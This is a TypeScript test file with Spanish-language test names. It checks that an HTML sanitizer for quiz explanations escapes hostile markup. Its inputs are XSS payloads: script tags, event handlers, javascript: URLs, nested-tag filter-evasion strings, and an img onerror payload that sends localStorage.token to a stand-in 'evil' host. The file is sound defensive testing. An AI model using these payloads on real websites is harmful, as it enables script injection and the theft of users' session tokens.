import { test } from "node:test";
import assert from "node:assert/strict";

import { htmlSeguro, lecturaSegura } from "../shared/sanitize.ts";

test("deja pasar las explicaciones legítimas con <b> e <i>", () => {
  const e = "Lo dice el texto: <i>one per week on average</i>. La <b>A</b> es al revés.";
  assert.equal(htmlSeguro(e), e);
  assert.equal(htmlSeguro("<strong>ojo</strong> y <em>matiz</em>"), "<strong>ojo</strong> y <em>matiz</em>");
});

test("escapa las etiquetas script", () => {
  assert.equal(htmlSeguro("<script>alert(1)</script>"), "&lt;script&gt;alert(1)&lt;/script&gt;");
});

test("escapa cualquier etiqueta fuera de la lista, con sus manejadores de eventos", () => {
  const out = htmlSeguro(`<img src=x onerror="fetch('//evil/'+localStorage.token)">`);
  assert.ok(!/[<>"']/.test(out), out);
  assert.ok(out.startsWith("&lt;img "));
});

test("una etiqueta permitida con atributos no pasa como etiqueta", () => {
  for (const malo of [
    `<b onclick="alert(1)">x</b>`,
    `<i style="position:fixed">x</i>`,
    `<b/onmouseover=alert(1)>x</b>`,
    `<em >x</em>`,
    `<b\n>x</b>`,
  ]) {
    const out = htmlSeguro(malo);
    assert.ok(!/<(?!\/?(?:b|i|strong|em)>)/.test(out), out);
    assert.ok(!/<(b|i|strong|em)[^>]/.test(out), out);
  }
});

test("las URL javascript: quedan como texto inerte", () => {
  const out = htmlSeguro(`<a href="javascript:alert(1)">pulsa</a>`);
  assert.equal(out, "&lt;a href=&quot;javascript:alert(1)&quot;&gt;pulsa&lt;/a&gt;");
});

test("etiquetas anidadas o mal formadas no reconstruyen una etiqueta viva", () => {
  for (const malo of [
    "<<b>script>alert(1)<</b>/script>",
    "<scr<b>ipt>alert(1)</scr</b>ipt>",
    "<b<script>alert(1)</script>>",
    "<svg/onload=alert(1)",
    "<iframe srcdoc='<script>1</script>'>",
    "<B><I></I></B><ScRiPt>1</ScRiPt>",
  ]) {
    const out = htmlSeguro(malo);
    assert.ok(!/<(?!\/?(?:b|i|strong|em)>)/.test(out), `${malo} → ${out}`);
  }
  assert.equal(htmlSeguro("<B>x</B>"), "<b>x</b>");
});

test("las entidades se conservan y un & suelto se escapa", () => {
  assert.equal(htmlSeguro("Tom &amp; Jerry &lt;3 &#39;ok&#39; &#x27;"), "Tom &amp; Jerry &lt;3 &#39;ok&#39; &#x27;");
  assert.equal(htmlSeguro("R&D y a < b"), "R&amp;D y a &lt; b");
  assert.equal(htmlSeguro(`"comillas" y 'apóstrofos'`), "&quot;comillas&quot; y &#39;apóstrofos&#39;");
});

test("lo ya escapado no se escapa dos veces ni revive como etiqueta", () => {
  const una = htmlSeguro(`<script>x</script> <b>ok</b> & "y"`);
  assert.equal(htmlSeguro(una), una);
  assert.equal(htmlSeguro("&lt;b&gt;literal&lt;/b&gt;"), "&lt;b&gt;literal&lt;/b&gt;");
  assert.equal(htmlSeguro("&lt;script&gt;"), "&lt;script&gt;");
});

test("lo que no es texto se queda en cadena vacía", () => {
  for (const v of [undefined, null, 42, true, {}, ["<b>"], { toString: () => "<script>" }]) {
    assert.equal(htmlSeguro(v), "");
  }
});

test("lecturaSegura limpia la explicación de cada pregunta sin tocar el original", () => {
  const sucia = {
    title: "T",
    body: ["uno", "dos"],
    qs: [
      { q: "¿?", o: ["a", "b", "c", "d"], a: 1, e: `<img src=x onerror=alert(1)> <i>cita</i>` },
      { q: "¿?", o: ["a", "b", "c", "d"], a: 0 } as { q: string; o: string[]; a: number; e: string },
    ],
  };
  const copia = JSON.parse(JSON.stringify(sucia));
  const limpia = lecturaSegura(sucia);
  assert.equal(limpia.qs[0].e, "&lt;img src=x onerror=alert(1)&gt; <i>cita</i>");
  assert.equal(limpia.qs[1].e, "");
  assert.deepEqual(limpia.body, sucia.body);
  assert.deepEqual(sucia, copia);
});
